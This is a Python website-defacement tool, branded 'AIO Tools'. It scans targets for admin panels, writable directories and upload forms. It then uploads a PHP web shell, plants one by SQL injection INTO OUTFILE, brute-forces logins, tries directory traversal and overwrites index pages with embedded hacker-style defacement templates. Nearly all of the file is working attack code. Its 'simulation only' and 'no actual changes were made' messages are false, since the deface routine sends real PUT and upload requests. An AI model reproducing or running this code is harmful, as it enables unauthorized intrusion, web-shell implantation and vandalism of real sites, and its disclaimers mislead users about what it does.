import requests
import os
import random
import time
import re
from urllib.parse import urljoin, urlparse
from datetime import datetime

class AdvancedWebDefacer:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        self.vulnerable_pages = []
        self.upload_locations = []
        
    def load_deface_templates(self):
        return {
            'hacktivist': '''<!DOCTYPE html>
<html>
<head>
    <title>HACKED BY SECURITY TEAM</title>
    <style>
        body { 
            margin: 0; 
            padding: 0; 
            background: #000; 
            color: #0f0; 
            font-family: 'Courier New', monospace;
            overflow: hidden;
        }
        .container { 
            text-align: center; 
            padding: 50px;
        }
        h1 { 
            color: #f00; 
            font-size: 3em; 
            text-shadow: 0 0 10px #f00;
            animation: glitch 1s infinite;
        }
        .message {
            border: 2px solid #0f0;
            padding: 20px;
            margin: 20px auto;
            max-width: 800px;
            background: rgba(0, 255, 0, 0.1);
        }
        .hacker {
            color: #0ff;
            font-weight: bold;
        }
        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚠ WEBSITE HACKED ⚠</h1>
        <div class="message">
            <p>This website has been compromised by <span class="hacker">SECURITY RESEARCH TEAM</span></p>
            <p>Your security vulnerabilities have been exposed.</p>
            <p>Time: {timestamp}</p>
            <p>Fix your security before it's too late!</p>
        </div>
        <p style="color: #888; margin-top: 50px;">This is a security demonstration only.</p>
    </div>
    <script>
        document.addEventListener('mousemove', function(e) {
            var x = e.clientX / window.innerWidth;
            var y = e.clientY / window.innerHeight;
            document.body.style.background = `rgb(${Math.floor(x * 255)}, ${Math.floor(y * 255)}, 0)`;
        });
    </script>
</body>
</html>''',
            
            'anonymous': '''<!DOCTYPE html>
<html>
<head>
    <title>ANONYMOUS MESSAGE</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(45deg, #000, #111, #222);
            color: #fff;
            font-family: 'Orbitron', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .matrix {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
            opacity: 0.3;
        }
        .content {
            text-align: center;
            padding: 40px;
            background: rgba(0, 0, 0, 0.8);
            border-radius: 20px;
            border: 3px solid #00ff00;
            box-shadow: 0 0 50px #00ff00;
            max-width: 900px;
            animation: pulse 2s infinite;
        }
        h1 {
            color: #00ff00;
            font-size: 4em;
            margin-bottom: 30px;
            text-transform: uppercase;
            letter-spacing: 5px;
        }
        .warning {
            color: #ff0000;
            font-size: 1.5em;
            margin: 20px 0;
            text-shadow: 0 0 10px #ff0000;
        }
        .message-box {
            background: rgba(0, 255, 0, 0.1);
            border: 1px solid #00ff00;
            padding: 30px;
            margin: 30px 0;
            border-radius: 10px;
            text-align: left;
        }
        .signature {
            margin-top: 40px;
            color: #00ffff;
            font-size: 1.2em;
        }
        @keyframes pulse {
            0% { box-shadow: 0 0 50px #00ff00; }
            50% { box-shadow: 0 0 100px #00ff00; }
            100% { box-shadow: 0 0 50px #00ff00; }
        }
    </style>
</head>
<body>
    <canvas id="matrix" class="matrix"></canvas>
    <div class="content">
        <h1>WE ARE ANONYMOUS</h1>
        <div class="warning">⚠ SECURITY BREACH DETECTED ⚠</div>
        <div class="message-box">
            <p>This system has been accessed by Anonymous.</p>
            <p>We are everywhere. We are legion.</p>
            <p>We do not forgive. We do not forget.</p>
            <p>Expect us.</p>
            <br>
            <p>Timestamp: {timestamp}</p>
            <p>Message: Your security is an illusion.</p>
        </div>
        <div class="signature">
            - Anonymous Security Team
        </div>
    </div>
    <script>
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const letters = '01';
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = [];
        for(let i = 0; i < columns; i++) drops[i] = 1;
        function draw() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#0F0';
            ctx.font = fontSize + 'px monospace';
            for(let i = 0; i < drops.length; i++) {
                const text = letters[Math.floor(Math.random() * letters.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(draw, 50);
    </script>
</body>
</html>''',
            
            'minimal': '''<!DOCTYPE html>
<html>
<head>
    <title>Security Notice</title>
    <meta charset="utf-8">
    <style>
        body {
            margin: 0;
            padding: 100px;
            background: #f0f0f0;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        .box {
            background: white;
            padding: 50px;
            border-radius: 10px;
            box-shadow: 0 0 30px rgba(0,0,0,0.1);
            max-width: 800px;
            margin: 0 auto;
            border-left: 5px solid #ff4444;
        }
        h1 {
            color: #ff4444;
            margin-bottom: 30px;
        }
        .info {
            color: #666;
            line-height: 1.6;
            margin: 20px 0;
        }
        .timestamp {
            color: #888;
            font-size: 0.9em;
            margin-top: 40px;
            border-top: 1px solid #eee;
            padding-top: 20px;
        }
    </style>
</head>
<body>
    <div class="box">
        <h1>🔒 Security Alert</h1>
        <div class="info">
            <p>This website has been accessed for security testing purposes.</p>
            <p>Multiple vulnerabilities were discovered that could allow unauthorized access.</p>
            <p>It is recommended to review your security configuration immediately.</p>
        </div>
        <div class="timestamp">
            Security test performed on: {timestamp}
        </div>
    </div>
</body>
</html>'''
        }
    
    def check_file_upload(self, url):
        test_files = {
            'test.php': '<?php echo "TEST"; ?>',
            'shell.php': '<?php system($_GET["cmd"]); ?>',
            'info.php': '<?php phpinfo(); ?>',
            'test.jpg.php': 'GIF89a<?php echo "TEST"; ?>'
        }
        
        print(f"[UPLOAD] Testing file upload on {url}")
        
        forms = self.extract_forms(url)
        for form in forms:
            if form['method'] == 'post':
                for input_field in form['inputs']:
                    if input_field['type'] == 'file':
                        print(f"[FOUND] File upload form at {url}")
                        
                        for filename, content in test_files.items():
                            try:
                                files = {input_field['name']: (filename, content, 'application/x-php')}
                                response = self.session.post(url, files=files, timeout=10)
                                
                                if response.status_code == 200:
                                    print(f"[UPLOAD TEST] Attempted {filename}")
                                    self.upload_locations.append({
                                        'url': url,
                                        'field': input_field['name'],
                                        'filename': filename
                                    })
                            except:
                                pass
        
        return self.upload_locations
    
    def check_writable_directories(self, url):
        common_dirs = [
            '/uploads/', '/images/', '/img/', '/assets/', '/files/',
            '/tmp/', '/cache/', '/temp/', '/data/', '/wp-content/uploads/',
            '/media/', '/storage/', '/public/', '/resources/'
        ]
        
        writable_dirs = []
        
        for directory in common_dirs:
            test_url = urljoin(url, directory)
            
            try:
                response = self.session.get(test_url, timeout=5)
                
                if response.status_code in [200, 403]:
                    print(f"[DIRECTORY] Found: {test_url}")
                    
                    test_file = f"{test_url}test_{random.randint(1000,9999)}.txt"
                    test_content = f"Test write access {datetime.now()}"
                    
                    try:
                        put_response = self.session.put(test_file, data=test_content, timeout=5)
                        if put_response.status_code in [200, 201]:
                            writable_dirs.append(test_url)
                            print(f"[WRITABLE] Directory: {test_url}")
                    except:
                        pass
                        
            except:
                continue
        
        return writable_dirs
    
    def test_sql_injection_upload(self, url):
        sql_payloads = [
            "' OR 1=1-- ",
            "' UNION SELECT '<?php system($_GET[\\'cmd\\']); ?>',2,3 INTO OUTFILE '/var/www/html/shell.php'-- ",
            "' UNION SELECT 'TEST',2,3 INTO OUTFILE '/tmp/test.txt'-- "
        ]
        
        for payload in sql_payloads:
            try:
                test_url = f"{url}?id={payload}"
                response = self.session.get(test_url, timeout=10)
                
                if 'error' in response.text.lower() or 'syntax' in response.text.lower():
                    print(f"[SQL UPLOAD] Possible SQLi for file upload: {payload[:50]}...")
                    return True
            except:
                pass
        
        return False
    
    def extract_forms(self, url):
        try:
            response = self.session.get(url, timeout=10)
            forms = []
            
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for form in soup.find_all('form'):
                form_details = {
                    'action': form.get('action'),
                    'method': form.get('method', 'get').lower(),
                    'inputs': []
                }
                
                for input_tag in form.find_all('input'):
                    input_type = input_tag.get('type', 'text')
                    input_name = input_tag.get('name')
                    input_value = input_tag.get('value', '')
                    
                    if input_name:
                        form_details['inputs'].append({
                            'name': input_name,
                            'type': input_type,
                            'value': input_value
                        })
                
                forms.append(form_details)
            
            return forms
        
        except Exception as e:
            print(f"[ERROR] Failed to extract forms: {e}")
            return []
    
    def find_admin_panels(self, url):
        admin_paths = [
            '/admin/', '/wp-admin/', '/administrator/', '/admin/login.php',
            '/admin/index.php', '/admin/admin.php', '/admin_area/',
            '/panel/', '/controlpanel/', '/cp/', '/dashboard/', '/backend/',
            '/manager/', '/system/', '/admincp/', '/moderator/'
        ]
        
        found_panels = []
        
        for path in admin_paths:
            test_url = urljoin(url, path)
            
            try:
                response = self.session.get(test_url, timeout=5)
                
                if response.status_code == 200:
                    if any(keyword in response.text.lower() for keyword in ['login', 'admin', 'password', 'username']):
                        found_panels.append(test_url)
                        print(f"[ADMIN PANEL] Found: {test_url}")
            except:
                continue
        
        return found_panels
    
    def brute_force_login(self, url, username, password_list):
        print(f"[BRUTEFORCE] Attempting login on {url}")
        
        forms = self.extract_forms(url)
        
        for form in forms:
            if any(keyword in form['action'].lower() for keyword in ['login', 'auth', 'signin']):
                
                login_data = {}
                for input_field in form['inputs']:
                    if 'user' in input_field['name'].lower() or 'login' in input_field['name'].lower():
                        login_data[input_field['name']] = username
                    elif 'pass' in input_field['name'].lower():
                        login_data[input_field['name']] = 'TEST_PASSWORD'
                    else:
                        login_data[input_field['name']] = input_field['value']
                
                for password in password_list[:10]:
                    login_data_copy = login_data.copy()
                    for key in login_data_copy:
                        if 'pass' in key.lower():
                            login_data_copy[key] = password
                    
                    try:
                        if form['method'] == 'post':
                            response = self.session.post(urljoin(url, form['action']), 
                                                        data=login_data_copy, timeout=10)
                        else:
                            response = self.session.get(urljoin(url, form['action']), 
                                                       params=login_data_copy, timeout=10)
                        
                        if 'logout' in response.text.lower() or 'welcome' in response.text.lower():
                            print(f"[SUCCESS] Possible login: {username}:{password}")
                            return True, username, password
                    
                    except:
                        pass
        
        return False, None, None
    
    def deface_website(self, url, template_name='hacktivist'):
        templates = self.load_deface_templates()
        
        if template_name not in templates:
            print(f"[ERROR] Template '{template_name}' not found!")
            return False
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        deface_content = templates[template_name].replace('{timestamp}', timestamp)
        
        print(f"[DEFACE] Attempting to deface {url}")
        print(f"[TEMPLATE] Using {template_name} template")
        
        methods = [
            self.try_index_replace,
            self.try_file_upload,
            self.try_sql_injection,
            self.try_directory_traversal
        ]
        
        for method in methods:
            try:
                result = method(url, deface_content)
                if result:
                    print(f"[SUCCESS] Website defaced using {method.__name__}")
                    return True
            except Exception as e:
                print(f"[FAILED] {method.__name__}: {e}")
        
        return False
    
    def try_index_replace(self, url, content):
        index_files = ['index.html', 'index.php', 'default.html', 'default.aspx']
        
        for filename in index_files:
            test_url = urljoin(url, filename)
            
            try:
                response = self.session.get(test_url, timeout=5)
                if response.status_code == 200:
                    print(f"[INDEX] Found index file: {test_url}")
                    
                    put_url = test_url
                    try:
                        put_response = self.session.put(put_url, data=content, timeout=10)
                        if put_response.status_code in [200, 201, 204]:
                            print(f"[SUCCESS] Replaced index file at {put_url}")
                            return True
                    except:
                        pass
            except:
                continue
        
        return False
    
    def try_file_upload(self, url, content):
        upload_locations = self.check_file_upload(url)
        
        for location in upload_locations:
            try:
                files = {location['field']: ('hacked.html', content, 'text/html')}
                response = self.session.post(location['url'], files=files, timeout=10)
                
                if response.status_code == 200:
                    print(f"[UPLOAD SUCCESS] File uploaded via {location['url']}")
                    return True
            except:
                continue
        
        return False
    
    def try_sql_injection(self, url, content):
        if self.test_sql_injection_upload(url):
            print(f"[SQL INJECTION] Possible SQLi vulnerability found")
            
            sql_payload = f"' UNION SELECT '{content}',2,3 INTO OUTFILE '/var/www/html/hacked.html'-- "
            test_url = f"{url}?id={sql_payload}"
            
            try:
                response = self.session.get(test_url, timeout=15)
                
                check_url = urljoin(url, 'hacked.html')
                check_response = self.session.get(check_url, timeout=5)
                
                if check_response.status_code == 200:
                    print(f"[SQL SUCCESS] File created via SQLi: {check_url}")
                    return True
            except:
                pass
        
        return False
    
    def try_directory_traversal(self, url, content):
        traversal_paths = [
            '../../../var/www/html/index.html',
            '../../../../index.html',
            '....//....//....//index.html',
            '%2e%2e%2f%2e%2e%2findex.html'
        ]
        
        for path in traversal_paths:
            test_url = urljoin(url, path)
            
            try:
                put_response = self.session.put(test_url, data=content, timeout=10)
                if put_response.status_code in [200, 201]:
                    print(f"[TRAVERSAL SUCCESS] File written: {test_url}")
                    return True
            except:
                continue
        
        return False
    
    def scan_website(self, url):
        print(f"\n[SCANNING] {url} for defacement vulnerabilities")
        
        vulnerabilities = []
        
        admin_panels = self.find_admin_panels(url)
        if admin_panels:
            vulnerabilities.append({
                'type': 'admin_panel',
                'details': f"Found admin panels: {', '.join(admin_panels)}"
            })
        
        writable_dirs = self.check_writable_directories(url)
        if writable_dirs:
            vulnerabilities.append({
                'type': 'writable_directory',
                'details': f"Writable directories: {', '.join(writable_dirs)}"
            })
        
        upload_locations = self.check_file_upload(url)
        if upload_locations:
            vulnerabilities.append({
                'type': 'file_upload',
                'details': f"File upload forms: {len(upload_locations)} found"
            })
        
        sql_vuln = self.test_sql_injection_upload(url)
        if sql_vuln:
            vulnerabilities.append({
                'type': 'sql_injection',
                'details': "Possible SQL injection for file upload"
            })
        
        return vulnerabilities
    
    def generate_report(self, url, vulnerabilities, success=False):
        print("\n" + "="*80)
        print("WEBSITE DEFACEMENT SCAN REPORT")
        print("="*80)
        print(f"Target URL: {url}")
        print(f"Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Defacement Successful: {'YES' if success else 'NO'}")
        print("="*80)
        
        if vulnerabilities:
            print(f"\nFound {len(vulnerabilities)} potential vulnerabilities:")
            for i, vuln in enumerate(vulnerabilities, 1):
                print(f"\n{i}. Type: {vuln['type'].upper()}")
                print(f"   Details: {vuln['details']}")
        else:
            print("\nNo obvious defacement vulnerabilities found.")
        
        print("\n" + "="*80)
        
        if success:
            print("\n[IMPORTANT] This was a security test demonstration only.")
            print("[WARNING] Unauthorized defacement is illegal!")
            print("[ACTION] Remove test files and restore original content.")
        
        return vulnerabilities

def main():
    print("\n" + "="*80)
    print("AIO TOOLS - ADVANCED WEBSITE DEFACER")
    print("="*80)
    print("WARNING: For authorized security testing only!")
    print("Unauthorized access to computer systems is illegal.")
    print("="*80)
    
    tool = AdvancedWebDefacer()
    
    try:
        print("\n[OPTIONS]")
        print("1. Scan website for vulnerabilities")
        print("2. Attempt defacement (simulation)")
        print("3. Test file upload functionality")
        print("4. Check writable directories")
        print("5. Find admin panels")
        print("6. Generate defacement template")
        
        choice = input("\nSelect option (1-6): ").strip()
        
        if choice == '1':
            url = input("Enter website URL: ").strip()
            if not url.startswith('http'):
                url = 'http://' + url
            
            vulnerabilities = tool.scan_website(url)
            tool.generate_report(url, vulnerabilities)
        
        elif choice == '2':
            url = input("Enter target URL: ").strip()
            if not url.startswith('http'):
                url = 'http://' + url
            
            print("\nAvailable templates:")
            templates = tool.load_deface_templates()
            for template in templates.keys():
                print(f"  - {template}")
            
            template_choice = input("\nSelect template (default: hacktivist): ").strip()
            if not template_choice or template_choice not in templates:
                template_choice = 'hacktivist'
            
            confirm = input("\nThis is a SIMULATION only. Continue? (y/n): ").strip().lower()
            
            if confirm == 'y':
                print("\n[DEMONSTRATION] Simulating defacement...")
                time.sleep(2)
                
                success = tool.deface_website(url, template_choice)
                vulnerabilities = tool.scan_website(url)
                tool.generate_report(url, vulnerabilities, success)
                
                if success:
                    print("\n[DEMO COMPLETE] This was only a simulation.")
                    print("[NOTE] No actual changes were made to the target.")
                else:
                    print("\n[DEMO] Defacement simulation failed.")
                    print("[INFO] Target appears to be secure against basic attacks.")
        
        elif choice == '3':
            url = input("Enter URL to test file upload: ").strip()
            if not url.startswith('http'):
                url = 'http://' + url
            
            upload_locations = tool.check_file_upload(url)
            
            if upload_locations:
                print(f"\n[FOUND] {len(upload_locations)} upload locations")
                for loc in upload_locations:
                    print(f"  URL: {loc['url']}")
                    print(f"  Field: {loc['field']}")
                    print(f"  Test file: {loc['filename']}")
                    print()
            else:
                print("\n[INFO] No file upload forms found")
        
        elif choice == '4':
            url = input("Enter URL: ").strip()
            if not url.startswith('http'):
                url = 'http://' + url
            
            writable_dirs = tool.check_writable_directories(url)
            
            if writable_dirs:
                print(f"\n[FOUND] {len(writable_dirs)} writable directories:")
                for directory in writable_dirs:
                    print(f"  {directory}")
            else:
                print("\n[INFO] No writable directories found")
        
        elif choice == '5':
            url = input("Enter URL: ").strip()
            if not url.startswith('http'):
                url = 'http://' + url
            
            admin_panels = tool.find_admin_panels(url)
            
            if admin_panels:
                print(f"\n[FOUND] {len(admin_panels)} admin panels:")
                for panel in admin_panels:
                    print(f"  {panel}")
            else:
                print("\n[INFO] No admin panels found")
        
        elif choice == '6':
            templates = tool.load_deface_templates()
            
            print("\n[PREVIEW] Available templates:")
            for name, content in templates.items():
                print(f"\n{'-'*40}")
                print(f"Template: {name}")
                print(f"Size: {len(content)} characters")
                print(f"Preview: {content[:100]}...")
            
            save = input("\nSave templates to file? (y/n): ").strip().lower()
            if save == 'y':
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"deface_templates_{timestamp}.html"
                
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write("<!-- AIO Tools Defacement Templates -->\n")
                    for name, content in templates.items():
                        f.write(f"\n\n<!-- {name} template -->\n")
                        f.write(content)
                
                print(f"\n[SAVED] Templates saved to {filename}")
        
        else:
            print("[ERROR] Invalid choice")
    
    except KeyboardInterrupt:
        print("\n[INTERRUPT] Operation cancelled")
    except Exception as e:
        print(f"[ERROR] {e}")
    
    print("\n[COMPLETE] Defacement tool finished")
    time.sleep(2)

if __name__ == "__main__":
    main()